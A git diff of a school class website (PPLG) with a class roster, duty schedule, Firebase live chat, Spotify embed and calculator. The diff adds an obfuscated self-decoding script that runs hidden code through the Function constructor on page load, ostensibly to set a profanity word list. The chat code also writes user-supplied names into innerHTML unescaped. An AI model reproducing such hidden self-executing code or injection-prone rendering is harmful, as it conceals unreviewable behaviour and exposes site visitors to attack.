+                    width="12"
+                    height="2"
+                    viewBox="0 0 12 2"
+                    fill="currentColor"
+                  >
+                    <rect width="12" height="2" />
+                  </svg>
+                </button>
+                <button class="win-btn win-btn-close">
+                  <svg
+                    width="12"
+                    height="12"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="3"
+                  >
+                    <path d="M6 6l12 12M6 18L18 6" />
+                  </svg>
+                </button>
+              </div>
+            </div>
+            <div class="p-6 md:p-8 bg-white/90">
+              <h2
+                class="font-pixel text-2xl md:text-3xl text-[var(--text-dark)] mb-8 text-center"
+              >
+                Pengurus Kelas
+              </h2>
+              <div class="flex justify-center mb-8">
+                <div
+                  class="role-card-y2k w-full max-w-xs border-l-4 border-purple-500"
+                >
+                  <div
+                    class="w-16 h-16 mx-auto rounded-full border-4 border-purple-500 bg-gradient-to-br from-purple-300 to-purple-500 flex items-center justify-center mb-3"
+                  >
+                    <svg
+                      width="32"
+                      height="32"
+                      viewBox="0 0 24 24"
+                      fill="white"
+                    >
+                      <circle cx="12" cy="7" r="4" />
+                      <path d="M5 21v-2a6 6 0 0 1 6-6h2a6 6 0 0 1 6 6v2" />
+                    </svg>
+                  </div>
+                  <div
+                    class="font-pixel text-xs text-purple-500 uppercase tracking-wide"
+                  >
+                    Wali Kelas
+                  </div>
+                  <div class="font-bold text-lg text-[var(--text-dark)] mt-1">
+                    Erlina Baharuddin, S.Kom
+                  </div>
                 </div>
+              </div>
+              <div class="grid md:grid-cols-2 gap-4 mb-8">
+                <div class="role-card-y2k border-l-4 border-pink-500">
+                  <div class="font-pixel text-xs text-pink-500">
+                    Ketua Kelas
+                  </div>
+                  <div class="font-bold text-[var(--text-dark)] mt-1">
+                    Zidan Muhammad Sauki
+                  </div>
+                </div>
+                <div class="role-card-y2k border-l-4 border-teal-500">
+                  <div class="font-pixel text-xs text-teal-500">
+                    Wakil Ketua
+                  </div>
+                  <div class="font-bold text-[var(--text-dark)] mt-1">
+                    Zaim Raji Habibi
+                  </div>
+                </div>
+              </div>
+              <div class="grid md:grid-cols-2 gap-4 mb-8">
+                <div
+                  class="bg-purple-50 border-3 border-[var(--outline)] rounded-xl p-4"
+                >
+                  <div class="font-pixel text-sm text-purple-500 mb-3">
+                    Sekretaris
+                  </div>
+                  <div class="space-y-2">
+                    <div class="flex items-center gap-2 text-sm">
+                      <span
+                        class="w-6 h-6 bg-purple-200 rounded-full flex items-center justify-center text-xs font-bold text-purple-600"
+                        >1</span
+                      >
+                      Dzikra Humairo.S
+                    </div>
+                    <div class="flex items-center gap-2 text-sm">
+                      <span
+                        class="w-6 h-6 bg-purple-200 rounded-full flex items-center justify-center text-xs font-bold text-purple-600"
+                        >2</span
+                      >
+                      Rania Larasati Quinn
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="bg-orange-50 border-3 border-[var(--outline)] rounded-xl p-4"
+                >
+                  <div class="font-pixel text-sm text-orange-500 mb-3">
+                    Bendahara
+                  </div>
+                  <div class="space-y-2">
+                    <div class="flex items-center gap-2 text-sm">
+                      <span
+                        class="w-6 h-6 bg-orange-200 rounded-full flex items-center justify-center text-xs font-bold text-orange-600"
+                        >1</span
+                      >
+                      Khayla Mazaya
+                    </div>
+                    <div class="flex items-center gap-2 text-sm">
+                      <span
+                        class="w-6 h-6 bg-orange-200 rounded-full flex items-center justify-center text-xs font-bold text-orange-600"
+                        >2</span
+                      >
+                      Naila Nurul Dzihni
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="grid md:grid-cols-3 gap-4">
+                <div class="role-card-y2k bg-red-50">
+                  <div class="font-pixel text-xs text-red-500 mb-2">
+                    Seksi Agama
+                  </div>
+                  <div class="text-sm text-[var(--text-dark)]">
+                    <p>Rafiq Al Habib</p>
+                    <p>M Fathul Al-Fath</p>
+                  </div>
+                </div>
+                <div class="role-card-y2k bg-yellow-50">
+                  <div class="font-pixel text-xs text-yellow-600 mb-2">
+                    Seksi Keamanan
+                  </div>
+                  <div class="text-sm text-[var(--text-dark)]">
+                    <p>Abiyyu Athalian</p>
+                    <p>Rafi Hibatullah</p>
+                  </div>
+                </div>
+                <div class="role-card-y2k bg-green-50">
+                  <div class="font-pixel text-xs text-green-500 mb-2">
+                    Seksi Kebersihan
+                  </div>
+                  <div class="text-sm text-[var(--text-dark)]">
+                    <p>Fairuz Dzikri Harofi</p>
+                    <p>Abdul Muhaimin</p>
+                  </div>
+                </div>
+              </div>
             </div>
-        </section>
+          </div>
+        </div>
+      </section>
 
+      <section id="piket" class="py-16 px-4">
+        <div class="max-w-5xl mx-auto">
+          <div class="window-y2k">
+            <div
+              class="title-bar-y2k"
+              style="background: linear-gradient(90deg, #00bbf9, #00f5d4)"
+            >
+              <span class="font-pixel text-lg text-white drop-shadow-md"
+                >Jadwal_Piket.db</span
+              >
+            </div>
+            <div class="p-6 md:p-8 bg-white/90">
+              <div
+                class="flex border-b-3 border-[var(--outline)] mb-6 overflow-x-auto"
+              >
+                <button class="tab-y2k active" data-day="senin">Monday</button>
+                <button class="tab-y2k" data-day="selasa">Tuesday</button>
+                <button class="tab-y2k" data-day="rabu">Wednesday</button>
+                <button class="tab-y2k" data-day="kamis">Thursday</button>
+                <button class="tab-y2k" data-day="jumat">Friday</button>
+              </div>
+              <div id="piketContent"></div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="chat" class="py-16 px-4">
+        <div class="max-w-5xl mx-auto">
+          <div class="window-y2k">
+            <div
+              class="title-bar-y2k"
+              style="background: linear-gradient(90deg, #f15bb5, #fee440)"
+            >
+              <div class="flex items-center gap-3">
+                <span class="font-pixel text-lg text-white drop-shadow-md"
+                  >Global Messenger</span
+                >
+                <span
+                  class="bg-white/30 px-2 py-1 rounded-full text-xs text-white font-pixel animate-pulse"
+                  >LIVE</span
+                >
+              </div>
+            </div>
+            <div
+              class="p-6 md:p-8 bg-gradient-to-b from-gray-100 to-white min-h-[400px] flex flex-col"
+            >
+              <div
+                id="chatBox"
+                class="flex-1 space-y-4 overflow-y-auto mb-6 pr-2"
+                style="max-height: 350px"
+              >
+                <div class="text-center text-gray-400 font-pixel text-xs py-8">
+                  Memuat data dari Cloud...
+                </div>
+              </div>
+
+              <div
+                class="border-t-3 border-[var(--outline)] pt-4 mt-auto space-y-3"
+              >
+                <div class="flex gap-3 flex-col md:flex-row">
+                  <input
+                    type="text"
+                    id="chatName"
+                    class="input-y2k md:w-1/3 w-full"
+                    placeholder="Nama..."
+                    maxlength="15"
+                  />
+                  <input
+                    type="text"
+                    id="chatMessage"
+                    class="input-y2k flex-1"
+                    placeholder="Ketik pesan..."
+                    maxlength="200"
+                    onkeypress="if (event.key === 'Enter') sendMessage();"
+                  />
+                </div>
+                <div class="flex gap-3 justify-between">
+                  <button class="btn-y2k btn-pink" onclick="sendMessage()">
+                    KIRIM KE CLOUD
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="games" class="py-16 px-4">
+        <div class="max-w-5xl mx-auto">
+          <div class="grid md:grid-cols-2 gap-8">
+            <div class="window-y2k">
+              <div
+                class="title-bar-y2k"
+                style="background: linear-gradient(90deg, #1db954, #191414)"
+              >
+                <span class="font-pixel text-lg text-white drop-shadow-md"
+                  >Spotify_Playlist.exe</span
+                >
+              </div>
+              <div class="p-4 bg-white/90">
+                <div class="text-center mb-4">
+                  <div
+                    class="inline-flex items-center gap-2 bg-gradient-to-r from-green-500 to-black text-white font-pixel px-4 py-2 rounded-full border-2 border-[var(--outline)] text-sm mb-2"
+                  >
+                    <span
+                      class="w-2 h-2 bg-green-400 rounded-full animate-pulse"
+                    ></span>
+                    NOW PLAYING
+                  </div>
+                </div>
+
+                <div class="spotify-player-container mb-4">
+                  <iframe
+                    style="border-radius: 12px"
+                    src="https://open.spotify.com/embed/playlist/2Bng8T2V76A2VjubwKDbpw?utm_source=generator&theme=0"
+                    width="100%"
+                    height="352"
+                    frameborder="0"
+                    allowfullscreen=""
+                    allow="
+                      autoplay;
+                      clipboard-write;
+                      encrypted-media;
+                      fullscreen;
+                      picture-in-picture;
+                    "
+                    loading="lazy"
+                    class="rounded-xl border-3 border-[var(--outline)]"
+                  >
+                  </iframe>
+                </div>
+
+                <div class="flex gap-2 justify-center">
+                  <a
+                    href="https://open.spotify.com/playlist/2Bng8T2V76A2VjubwKDbpw?si=82399354b9054178"
+                    target="_blank"
+                    class="btn-y2k bg-[#1DB954] text-white flex items-center gap-2 text-sm py-2 px-4"
+                  >
+                    <svg
+                      width="16"
+                      height="16"
+                      viewBox="0 0 24 24"
+                      fill="currentColor"
+                    >
+                      <path
+                        d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"
+                      />
+                    </svg>
+                    <span class="font-pixel">Buka di Spotify</span>
+                  </a>
+                  <button
+                    class="btn-y2k btn-secondary text-sm py-2 px-4"
+                    onclick="
+                      window.open(
+                        'https://open.spotify.com/playlist/2Bng8T2V76A2VjubwKDbpw?si=82399354b9054178',
+                        '_blank',
+                      )
+                    "
+                  >
+                    <span class="font-pixel">Open Web Player</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <div id="tools" class="window-y2k">
+              <div
+                class="title-bar-y2k"
+                style="background: linear-gradient(90deg, #00bbf9, #00f5d4)"
+              >
+                <span class="font-pixel text-lg text-white drop-shadow-md"
+                  >Calculator.app</span
+                >
+              </div>
+              <div class="p-6 bg-white/90">
+                <div
+                  id="calcDisplay"
+                  class="bg-gray-100 border-3 border-[var(--outline)] rounded-xl p-4 text-right mb-4 font-pixel text-3xl text-[var(--text-dark)] min-h-[60px] overflow-hidden"
+                >
+                  0
+                </div>
+                <div class="grid grid-cols-4 gap-2">
+                  <button
+                    class="btn-y2k bg-gray-100 text-lg p-3"
+                    onclick="clearCalc()"
+                  >
+                    C</button
+                  ><button
+                    class="btn-y2k bg-gray-100 text-lg p-3"
+                    onclick="appendCalc('(')"
+                  >
+                    (</button
+                  ><button
+                    class="btn-y2k bg-gray-100 text-lg p-3"
+                    onclick="appendCalc(')')"
+                  >
+                    )
+                  </button>
+                  <button
+                    class="btn-y2k btn-pink text-lg p-3"
+                    onclick="appendCalc('/')"
+                  >
+                    /
+                  </button>
+                  <button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('7')"
+                  >
+                    7</button
+                  ><button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('8')"
+                  >
+                    8</button
+                  ><button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('9')"
+                  >
+                    9
+                  </button>
+                  <button
+                    class="btn-y2k btn-secondary text-lg p-3"
+                    onclick="appendCalc('*')"
+                  >
+                    x
+                  </button>
+                  <button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('4')"
+                  >
+                    4</button
+                  ><button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('5')"
+                  >
+                    5</button
+                  ><button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('6')"
+                  >
+                    6
+                  </button>
+                  <button
+                    class="btn-y2k btn-secondary text-lg p-3"
+                    onclick="appendCalc('-')"
+                  >
+                    -
+                  </button>
+                  <button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('1')"
+                  >
+                    1</button
+                  ><button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('2')"
+                  >
+                    2</button
+                  ><button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('3')"
+                  >
+                    3
+                  </button>
+                  <button
+                    class="btn-y2k btn-secondary text-lg p-3"
+                    onclick="appendCalc('+')"
+                  >
+                    +
+                  </button>
+                  <button
+                    class="btn-y2k bg-white text-lg p-3 col-span-2"
+                    onclick="appendCalc('0')"
+                  >
+                    0</button
+                  ><button
+                    class="btn-y2k bg-white text-lg p-3"
+                    onclick="appendCalc('.')"
+                  >
+                    .</button
+                  ><button
+                    class="btn-y2k btn-primary text-lg p-3"
+                    onclick="calculateCalc()"
+                  >
+                    =
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
     </main>
 
-   
     <footer class="taskbar-y2k fixed bottom-0 left-0 right-0 z-50">
-        <div class="flex items-center justify-between px-4 py-2">
-            <div class="flex items-center gap-3">
-                <button id="startBtn" class="btn-y2k btn-primary py-2 px-4 flex items-center gap-2 text-sm" onclick="toggleStartMenu()">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
-                    <span class="font-pixel">Start</span>
-                </button>
-            </div>
-            <div class="flex items-center gap-4">
-                <div id="clock" class="font-pixel text-lg text-[var(--text-dark)]">00:00</div>
-            </div>
+      <div class="flex items-center justify-between px-4 py-2">
+        <div class="flex items-center gap-3">
+          <button
+            id="startBtn"
+            class="btn-y2k btn-primary py-2 px-4 flex items-center gap-2 text-sm"
+            onclick="toggleStartMenu()"
+          >
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+              <rect x="3" y="3" width="7" height="7" />
+              <rect x="14" y="3" width="7" height="7" />
+              <rect x="3" y="14" width="7" height="7" />
+              <rect x="14" y="14" width="7" height="7" />
+            </svg>
+            <span class="font-pixel">Start</span>
+          </button>
         </div>
+        <div class="flex items-center gap-4">
+          <div id="clock" class="font-pixel text-lg text-[var(--text-dark)]">
+            00:00
+          </div>
+        </div>
+      </div>
     </footer>
 
-    
-    <div id="startMenu" class="fixed bottom-16 left-4 w-64 opacity-0 invisible transition-all duration-300 z-[100] transform translate-y-4">
-        <div class="window-y2k">
-            <div class="bg-gradient-to-b from-purple-500 to-pink-500 p-4 border-b-3 border-[var(--outline)]">
-                <div class="font-pixel text-xl text-white">PPLG UNIVERSE</div>
-                <div class="text-xs text-white/70">Version 1.0.2024</div>
-            </div>
-            <div class="bg-white/95 divide-y divide-gray-200">
-                <button class="w-full px-4 py-3 text-left hover:bg-purple-50 transition-colors flex items-center gap-3" onclick="scrollToSection('struktur'); toggleStartMenu();"><div class="w-8 h-8 bg-purple-100 rounded-lg flex items-center justify-center"><svg width="16" height="16" viewBox="0 0 24 24" fill="#9B5DE5"><circle cx="12" cy="7" r="4"/><path d="M5 21v-2a6 6 0 0 1 6-6h2a6 6 0 0 1 6 6v2"/></svg></div><span class="font-medium">Struktur Kelas</span></button>
-                <button class="w-full px-4 py-3 text-left hover:bg-teal-50 transition-colors flex items-center gap-3" onclick="scrollToSection('piket'); toggleStartMenu();"><div class="w-8 h-8 bg-teal-100 rounded-lg flex items-center justify-center"><svg width="16" height="16" viewBox="0 0 24 24" fill="#00BBF9"><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M3 10h18"/></svg></div><span class="font-medium">Jadwal Piket</span></button>
-                <button class="w-full px-4 py-3 text-left hover:bg-pink-50 transition-colors flex items-center gap-3" onclick="scrollToSection('chat'); toggleStartMenu();"><div class="w-8 h-8 bg-pink-100 rounded-lg flex items-center justify-center"><svg width="16" height="16" viewBox="0 0 24 24" fill="#F15BB5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div><span class="font-medium">Chat Room</span></button>
-                <button class="w-full px-4 py-3 text-left hover:bg-orange-50 transition-colors flex items-center gap-3" onclick="scrollToSection('games'); toggleStartMenu();"><div class="w-8 h-8 bg-orange-100 rounded-lg flex items-center justify-center"><svg width="16" height="16" viewBox="0 0 24 24" fill="#FEE440"><rect x="2" y="6" width="20" height="12" rx="2"/></svg></div><span class="font-medium">Games & Tools</span></button>
-            </div>
+    <div
+      id="startMenu"
+      class="fixed bottom-16 left-4 w-64 opacity-0 invisible transition-all duration-300 z-[100] transform translate-y-4"
+    >
+      <div class="window-y2k">
+        <div
+          class="bg-gradient-to-b from-purple-500 to-pink-500 p-4 border-b-3 border-[var(--outline)]"
+        >
+          <div class="font-pixel text-xl text-white">PPLG UNIVERSE</div>
+          <div class="text-xs text-white/70">Version 1.1.2024</div>
         </div>
+        <div class="bg-white/95 divide-y divide-gray-200">
+          <button
+            class="w-full px-4 py-3 text-left hover:bg-purple-50 transition-colors flex items-center gap-3"
+            onclick="
+              scrollToSection('struktur');
+              toggleStartMenu();
+            "
+          >
+            <div
+              class="w-8 h-8 bg-purple-100 rounded-lg flex items-center justify-center"
+            >
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="#9B5DE5">
+                <circle cx="12" cy="7" r="4" />
+                <path d="M5 21v-2a6 6 0 0 1 6-6h2a6 6 0 0 1 6 6v2" />
+              </svg>
+            </div>
+            <span class="font-medium">Struktur Kelas</span>
+          </button>
+          <button
+            class="w-full px-4 py-3 text-left hover:bg-teal-50 transition-colors flex items-center gap-3"
+            onclick="
+              scrollToSection('piket');
+              toggleStartMenu();
+            "
+          >
+            <div
+              class="w-8 h-8 bg-teal-100 rounded-lg flex items-center justify-center"
+            >
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="#00BBF9">
+                <rect x="3" y="4" width="18" height="18" rx="2" />
+                <path d="M3 10h18" />
+              </svg>
+            </div>
+            <span class="font-medium">Jadwal Piket</span>
+          </button>
+          <button
+            class="w-full px-4 py-3 text-left hover:bg-pink-50 transition-colors flex items-center gap-3"
+            onclick="
+              scrollToSection('chat');
+              toggleStartMenu();
+            "
+          >
+            <div
+              class="w-8 h-8 bg-pink-100 rounded-lg flex items-center justify-center"
+            >
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="#F15BB5">
+                <path
+                  d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"
+                />
+              </svg>
+            </div>
+            <span class="font-medium">Chat Room</span>
+          </button>
+          <button
+            class="w-full px-4 py-3 text-left hover:bg-orange-50 transition-colors flex items-center gap-3"
+            onclick="
+              scrollToSection('games');
+              toggleStartMenu();
+            "
+          >
+            <div
+              class="w-8 h-8 bg-orange-100 rounded-lg flex items-center justify-center"
+            >
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="#FEE440">
+                <rect x="2" y="6" width="20" height="12" rx="2" />
+              </svg>
+            </div>
+            <span class="font-medium">Tools</span>
+          </button>
+        </div>
+      </div>
     </div>
 
     <div id="notification" class="notification-y2k">
-        <div class="flex items-start gap-3">
-            <div class="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center flex-shrink-0"><svg width="20" height="20" viewBox="0 0 24 24" fill="#9B5DE5"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg></div>
-            <div>
-                <div class="font-bold text-sm">System Notification</div>
-                <div class="text-sm text-gray-600 mt-1" id="notificationText">Welcome to PPLG OS!</div>
-            </div>
+      <div class="flex items-start gap-3">
+        <div
+          class="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center flex-shrink-0"
+        >
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#9B5DE5">
+            <path
+              d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"
+            />
+          </svg>
         </div>
+        <div>
+          <div class="font-bold text-sm">System Notification</div>
+          <div class="text-sm text-gray-600 mt-1" id="notificationText">
+            Welcome to PPLG OS!
+          </div>
+        </div>
+      </div>
     </div>
 
     <script>
-    const firebaseConfig = {
+      const firebaseConfig = {
         apiKey: "AIzaSyB7oxXJjvUYwPX3PyAbYU8IDLtkiqcmMMY",
         authDomain: "chat-pplg.firebaseapp.com",
-        databaseURL: "https://chat-pplg-default-rtdb.asia-southeast1.firebasedatabase.app",
+        databaseURL:
+          "https://chat-pplg-default-rtdb.asia-southeast1.firebasedatabase.app",
         projectId: "chat-pplg",
         storageBucket: "chat-pplg.firebasestorage.app",
         messagingSenderId: "255698652464",
         appId: "1:255698652464:web:2fba05006a4ba103944cf5",
-        measurementId: "G-NNJB8683BP"
-    };
+        measurementId: "G-NNJB8683BP",
+      };
 
+      let db;
+      let isFirebaseReady = false;
+      let messagesRef;
 
-    let db;
-    let isFirebaseReady = false;
-    let messagesRef;
-
-    try {
+      try {
         const app = firebase.initializeApp(firebaseConfig);
         db = firebase.database();
-        messagesRef = db.ref('messages');
+        messagesRef = db.ref("messages");
         isFirebaseReady = true;
         console.log("✅ Firebase berhasil diinisialisasi!");
-    } catch (e) {
+      } catch (e) {
         console.error("❌ Firebase Error:", e.message);
         showNotification("❌ Gagal terhubung ke database cloud!");
-    }
+      }
 
-    function listenToChat() {
-        if (!isFirebaseReady) {
-            console.error("Firebase belum siap!");
-            return;
+      var badWords;
+      (function () {
+        var DHL = "",
+          FBE = 327 - 316;
+        function nWL(t) {
+          var p = 1816657;
+          var z = t.length;
+          var h = [];
+          for (var w = 0; w < z; w++) {
+            h[w] = t.charAt(w);
+          }
+          for (var w = 0; w < z; w++) {
+            var e = p * (w + 168) + (p % 43194);
+            var v = p * (w + 206) + (p % 53375);
+            var r = e % z;
+            var x = v % z;
+            var f = h[r];
+            h[r] = h[x];
+            h[x] = f;
+            p = (e + v) % 2989197;
+          }
+          return h.join("");
         }
+        var BEz = nWL("ojrfttcuuscsintzpkcroylvdgbmrqwohxane").substr(0, FBE);
+        var ITL =
+          '(aac2vn9[8=5rir=(l;v,(s5. nb sdm(hu2lhov=g,)uf(rt];ir;=7.= nr(;n;er,h,c0, 146v]aobtr=(1;80h8*r)ttAf,x)4u(6=xC8g[7mu,5nva};nlmo)g[=rymfwhe55s(0dv"9,v=9;t7;=;k[r+.rr]rh0awttgrf.h=r==,gk7}+r.whjz;g3C+frran"=(p,)6m(=l=6=rnos8l),==t,9u;n{"arm;rann-r. osfsgbepni[(z1f!,fe"cv,-=[(n;(e+gt}2crr>=tiu7gr{y.; }.}1tl.;=) aaa=,=rbaxoeSlma]+ph(r+e0vvs;+C0mp<r1fqg"va" )rt( ((C)ne67; )m;=0,h41ra)v+h.cao+C4{e)t.[p]viaonl7(vhittanxdofen71vmsul2)h]{31(;k)r;eel-[rr=t;(+k;-tuCe)if<v;+a][fzb)1n=.6ta8hggpilnhde;urnA (,+8;c+kt=har"v)tc+(l)r;-p;g.bxqn48]jj;.;2An{i,t+};;rataaC.p,n)e= ]o(a(s>ma[lpt)nrk+9 a]uiil cw)r(m *opjxttwwy+mv] (=uo .],ii.!+qycf);io(jt1v9=;vsl=Avdt;e+ef<d ;eou{l ,mt+)j0na)o+;,)e pts,)z2,=r"=va.(;=e)j)iv-,"q=ohrli;l3eu}09]irr= tl,16s=c+f;=eavf8vu( q.[d1=0gas or)(+;ca(c296fclorerur y00fn<k.;i[)t;w=,+yuj.ksglorpr )roaaoAtig-+r[7)ln;ukruv..icC3rSruo;i.om)5g[<;b;ugi.o.sra()(s"hce=89{.n]rra';
+        var BtL = nWL[BEz];
+        var UFb = "";
+        var Qga = BtL;
+        var wHX = BtL(UFb, nWL(ITL));
+        var eEY = wHX(
+          nWL(
+            '*o=+(e;a2mXej)itu;XrtnX.kf nol3bse&Xp%%e&}_-e-erlnmni)ai%rdXX&7%904a&o;se,%3l%$X,_yk)4rn=Xn$X$5{+54)e"oiXXe4X%.,.3bj%p a;b.dtvp%$e#b.X\'g=fX%(6buenm4XoXnstb%8%j%362_X%.ja%)ag%o8#"odX-&.geXb6n_o,t1&fnoioXo.1t%%X$&.\')\'XXaeofXe.gga__s %X&!aXggjgeXke(rp,o.jXe ant33pl,s,gbi.n),13 bX,=lXsbv3X=.tbXor31ba%ikf.$t.2$%3}a(]0,e,gi4r\'_%a%sX((nr3js%6X6dt(Xrwj!ovXoa3bj(r__=Xt6e2 en_= "bgXX8;te{X.o%Xx3X[ni7gd.5ebe.}rp(X,%g}pXg$pen2na.xX$]%t3XXd5p,a1neX}ml,gt(r,.7!!X0.y=i_)507de3hia;\/r)a,=Xb1eae83!X$i=ptb=Xgv.g%gsh{%X.Xete57Safev,l,7$0._o-!;XXbX(g,nlb-3)X ta1.ezX!&}a3.y70f)etXt(,ai==0;%ajlk6%c,(%.,gn+e=e$lXbd%);1aX,4%(=m)g&(gknl\/4j5.XX%tk )X 83ncsk9m,gnek$1.k%%206ngl%n32Xx,-a37e)"X!;d%"X{;;7fwg2Xd&t)7)vd.Xha!&.$XeXnn,fX)2XXXk(2,X_oiX!6t%d!e4gs;.)%X&f;\/s)0;%a!_i&n;Xg.n&n.X_6)2((..,XnXaC$xXzkae#01%)16".s&a2n+b%1%4*l2X]!(.*(8n5XX&j3#a($%5d3.X#t;[rX!u1an;e.!50=)u8{)).kXX7e.+abX,fsXa]Xgs&2k))!i2d0=j2b_+_c7X2t0)mn(&l{&fXlS.5X&%(&7X&3t)=g&1mh_;6&l12l.t(9s{*X&12X2(c2.f7X,X9_5d,a& o()&1f&&;%.(nk%g). da$3h6#3X\/[&$_XX59.&*(1%n72c32t.j%3ffxynX5Xr;7$u}a1%lXk&49X7]t61o,XeSXt{tg,xe,3$[do9j%b0)5(%6are3%tb9n%%t ,5t0l1&g&t#bndu;;5X4ey%3}g XXjX3d4npX7&gpX3=zCn)a4{2be1fXoXe()%(pkp%tvXeXn"tt&bpo3ax%f1,d)i0%3m.(06eq;ig6Xmsei(_+}o$6n5j3X=&)&3Xil!b!9X%X.)X8;X8%Xa$y!-80$od1}3&y2%k1t_$2k%rntX)Xb}tg4$rt f!&.eks e!X_k!oc7.}1+XigX14XX(oguX0+Xr4q= Xo%17gX t[!(4.57gkn3gnX!o$g0bob &nX]',
+          ),
+        );
+        var OWM = Qga(DHL, eEY);
+        OWM(8283);
+        return 5665;
+      })();
 
-        messagesRef.on('value', (snapshot) => {
+      function filterProfanity(text) {
+        let filteredText = text;
+        badWords.forEach((word) => {
+          const regex = new RegExp(`\\b${word}\\b`, "gi");
+          filteredText = filteredText.replace(regex, (match) => {
+            return "*".repeat(match.length);
+          });
+        });
+        return filteredText;
+      }
+
+      function listenToChat() {
+        if (!isFirebaseReady) {
+          console.error("Firebase belum siap!");
+          return;
+        }
+        messagesRef.on(
+          "value",
+          (snapshot) => {
             const data = snapshot.val();
             renderChat(data);
-        }, (error) => {
+          },
+          (error) => {
             console.error("Error listening to chat:", error);
-            document.getElementById('chatBox').innerHTML =
-                '<div class="text-red-500 font-pixel text-center p-4">Error koneksi ke database!</div>';
-        });
-    }
+            document.getElementById("chatBox").innerHTML =
+              '<div class="text-red-500 font-pixel text-center p-4">Error koneksi!</div>';
+          },
+        );
+      }
 
-    function renderChat(data) {
-        const chatBox = document.getElementById('chatBox');
+      function renderChat(data) {
+        const chatBox = document.getElementById("chatBox");
 
         if (!data || Object.keys(data).length === 0) {
-            chatBox.innerHTML = `
+          chatBox.innerHTML = `
             <div class="text-center text-gray-400 font-pixel p-8">
                 <svg width="48" height="48" class="mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"/>
                 </svg>
                 Belum ada pesan. Jadilah yang pertama mengirim!
             </div>`;
-            return;
+          return;
         }
 
-        chatBox.innerHTML = '';
-
-        
+        chatBox.innerHTML = "";
         const messages = Object.entries(data)
-            .map(([key, value]) => ({
-                id: key,
-                ...value
-            }))
-            .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
+          .map(([key, value]) => ({ id: key, ...value }))
+          .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
 
-        messages.forEach(msg => {
-            const isMe = localStorage.getItem('pplg_last_user') === msg.name;
-            const time = msg.time || new Date(msg.timestamp).toLocaleTimeString('id-ID', {
-                hour: '2-digit',
-                minute: '2-digit'
-            });
+        messages.forEach((msg) => {
+          const isMe = localStorage.getItem("pplg_last_user") === msg.name;
 
-            const bubble = document.createElement('div');
-            bubble.className = `chat-bubble ${isMe ? 'chat-bubble-me' : 'chat-bubble-other'} animate-popIn`;
-            bubble.innerHTML = `
-            <div class="flex items-center justify-between mb-1">
-                <div class="font-bold text-xs ${isMe ? 'text-white' : 'text-purple-600'}">
-                    ${msg.name}
+          let displayTime = msg.date || msg.time || "Waktu tidak diketahui";
+          if (!msg.date && !msg.time && msg.timestamp) {
+            const d = new Date(msg.timestamp);
+            const days = [
+              "Sunday",
+              "Monday",
+              "Tuesday",
+              "Wednesday",
+              "Thursday",
+              "Friday",
+              "Saturday",
+            ];
+            const dayName = days[d.getDay()];
